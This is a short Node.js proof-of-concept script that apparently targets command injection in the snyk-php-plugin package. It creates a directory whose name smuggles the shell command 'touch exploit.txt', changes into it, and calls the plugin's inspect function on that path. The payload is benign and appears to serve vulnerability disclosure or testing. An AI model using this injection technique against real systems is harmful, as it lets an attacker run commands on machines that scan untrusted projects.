let fs = require('fs');

const maliciousDir = './injected; touch exploit.txt; #';

if (!fs.existsSync(maliciousDir)) {
  fs.mkdirSync(maliciousDir, { recursive: true });
}

process.chdir(maliciousDir);
console.log('Changed working directory to:', process.cwd());

let { inspect } = require('snyk-php-plugin');

inspect(process.cwd(), { composerIsFine: false, composerPharIsFine: true });
